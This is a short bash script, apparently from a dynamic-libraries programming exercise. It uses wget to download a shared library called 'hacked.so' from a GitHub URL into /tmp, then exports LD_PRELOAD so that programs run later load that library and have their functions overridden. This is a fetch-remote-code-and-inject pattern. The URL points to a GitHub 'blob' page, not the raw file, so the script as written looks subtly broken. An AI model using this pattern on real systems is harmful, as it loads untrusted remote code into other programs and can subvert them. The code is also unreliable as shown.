#!/bin/bash
wget -P /tmp https://github.com/pacmanlolo/alx-low_level_programming/blob/master/0x18-dynamic_libraries/hacked.so
export LD_PRELOAD=/tmp/hacked.so
